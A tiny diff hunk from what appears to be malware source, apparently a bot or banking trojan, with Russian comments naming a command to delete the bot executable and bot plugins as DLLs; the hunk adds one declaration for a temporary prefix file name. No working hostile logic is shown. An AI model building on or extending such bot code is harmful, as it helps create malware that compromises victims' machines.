@@ -73,6 +73,7 @@ extern CSSTR EStrProcessCommandDeleteBot[];  // Команда на удаление exe бота
 
 // Имя фала префикса
 extern CSSTR EStrPrefixFileName[];
+extern CSSTR EStrTemporaryPrefixFileName[]; // Временный Файл хранения префикса
 
 // Имена плагина бота в виде длл
 extern CSSTR EStrBotPlug[];
